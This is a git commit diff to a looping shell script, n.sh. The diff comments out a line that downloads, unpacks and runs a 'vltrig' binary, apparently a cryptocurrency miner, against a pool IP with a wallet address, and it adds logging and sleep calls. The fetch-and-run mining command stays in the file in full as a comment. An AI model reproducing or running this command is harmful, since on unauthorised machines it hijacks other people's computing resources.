f84db8c852e1ad5487a7893f2334e5900966a2f5
harrycloudstore <harrycloudstore@gmail.com>
2026-05-03 08:20:20 +0800

    Update n.sh

--- n.sh
+++ n.sh
@@ -2,11 +2,18 @@
 
 cd "$(dirname "$0")"
 
+echo "[INIT] n.sh started at $(date)" >> log.txt
+
 while true; do
-  echo "[RUN] $(date)"
+  echo "[RUN] $(date)" | tee -a log.txt
 
-  wget -O vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz && tar -xzf vltrig.tar.gz && chmod +x vltrig && ./vltrig -o 45.79.221.56:443 -u 88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX -p x -t 3
+  # wget -O vltrig.tar.gz https://github.com/HashVault/vltrig/releases/download/v6.26.0.4/vltrig-v6.26.0.4-linux-x64.tar.gz && tar -xzf vltrig.tar.gz && chmod +x vltrig && ./vltrig -o 45.79.221.56:443 -u 88yrgvUpdYx1RNon4zRcSKJbhXoCz4wcmQztNKrKddDkaWPamJiPNksLcCQcUnyMkF3JYzuiYUXNFCm4fVgJY9qB8qeCNTX -p x -t 3
+  echo "Working..." >> log.txt
 
+  # contoh delay kerja
   sleep 5
 
+  echo "[DONE] cycle complete" >> log.txt
+
+  sleep 10
 done
